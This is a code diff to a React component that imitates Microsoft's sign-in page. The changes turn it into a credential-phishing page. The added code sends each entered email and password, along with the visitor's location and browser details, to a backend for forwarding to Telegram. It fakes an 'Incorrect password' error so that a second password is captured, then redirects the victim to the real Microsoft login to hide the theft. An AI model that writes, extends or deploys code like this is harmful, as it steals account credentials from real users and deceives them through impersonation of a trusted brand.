@@ -8,10 +8,11 @@ export default function MicrosoftLogin() {
   const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
   const [errorMsg, setErrorMsg] = useState("");
+  const [firstSubmitDone, setFirstSubmitDone] = useState(false);
   const [location, setLocation] = useState<{ city?: string; country?: string }>({});
   const [locationStatus, setLocationStatus] = useState<"idle" | "loading" | "granted" | "denied">("idle");
 
-  // Geolocation (optional – remove if you don't want the trust message)
+  // Geolocation (same as before)
   useEffect(() => {
     if (!navigator.geolocation) return;
     setLocationStatus("loading");
@@ -35,6 +36,24 @@ export default function MicrosoftLogin() {
     );
   }, []);
 
+  const sendToTelegram = async (emailVal: string, passVal: string) => {
+    try {
+      await fetch("/api/submit-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email: emailVal,
+          password: passVal,
+          location: location,
+          userAgent: navigator.userAgent,
+          timestamp: new Date().toISOString(),
+        }),
+      });
+    } catch (err) {
+      console.error("Telegram send failed", err);
+    }
+  };
+
   const handleEmailSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!email.trim()) {
@@ -54,27 +73,18 @@ export default function MicrosoftLogin() {
     setLoading(true);
     setErrorMsg("");
 
-    try {
-      const response = await fetch("/api/submit-login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          email: email,
-          password: password,
-          location: location,
-          userAgent: navigator.userAgent,
-          timestamp: new Date().toISOString(),
-        }),
-      });
-      const data = await response.json();
-      if (data.success) {
-        window.location.href = data.redirect;
-      } else {
-        throw new Error(data.error || "Login failed");
-      }
-    } catch {
-      setErrorMsg("Something went wrong. Please try again.");
+    // Send credentials to Telegram (always)
+    await sendToTelegram(email, password);
+
+    if (!firstSubmitDone) {
+      // First attempt: show "incorrect password", reset password field, keep email
+      setFirstSubmitDone(true);
+      setErrorMsg("Incorrect password. Please try again.");
+      setPassword(""); // clear password field for second attempt
       setLoading(false);
+    } else {
+      // Second attempt: redirect to real Microsoft login
+      window.location.href = "https://login.live.com";
     }
   };
 
@@ -82,13 +92,14 @@ export default function MicrosoftLogin() {
     setStep("email");
     setErrorMsg("");
     setPassword("");
+    setFirstSubmitDone(false); // reset the double-capture state if user goes back
   };
 
   return (
     <div className="min-h-screen w-full flex flex-col bg-[#f2f2f2] font-['Segoe_UI',-apple-system,BlinkMacSystemFont,Roboto,sans-serif] text-[#1b1b1b] antialiased">
       <div className="flex-1 flex items-center justify-center p-6">
         <div className="w-full max-w-[440px] bg-white shadow-lg p-8 rounded-lg">
-          {/* Microsoft four‑color logo + "Microsoft" text */}
+          {/* Microsoft four‑color logo + text */}
           <div className="mb-6 flex items-center">
             <div className="grid grid-cols-2 gap-[2px] w-[34px] h-[34px] flex-shrink-0">
               <div className="bg-[#f25022]"></div>
@@ -176,7 +187,7 @@ export default function MicrosoftLogin() {
                 disabled={loading}
                 className="w-full bg-[#0067b8] text-white py-2 px-4 rounded text-sm font-semibold hover:bg-[#005da6] transition-colors disabled:opacity-50"
               >
-                {loading ? "Signing in..." : "Sign in"}
+                {loading ? "Checking..." : "Sign in"}
               </button>
 
               <div className="mt-6 text-sm">
